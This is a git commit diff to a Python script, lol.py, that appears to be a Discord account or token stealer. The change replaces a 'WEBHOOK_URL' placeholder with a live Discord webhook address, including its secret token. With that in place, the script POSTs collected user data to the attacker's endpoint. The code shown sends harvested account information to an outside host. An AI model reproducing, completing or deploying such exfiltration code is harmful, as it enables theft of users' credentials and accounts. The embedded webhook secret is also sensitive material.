6b139a32966b7fe1e7b5f7c3346a7863a54079e1
Clean583 <itzclan2060@gmail.com>
2025-03-27 20:58:49 +0100

    Update lol.py

--- lol.py
+++ lol.py
@@ -205,7 +205,7 @@ def main():
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('WEBHOOK_URL', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1354907314758488244/pU-1AY26Bgllx8DCCgFMHTCLoetYpJVlHC8UHhR_ZQpUpHNZFiBTP99BFj_TnQwAplwp', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
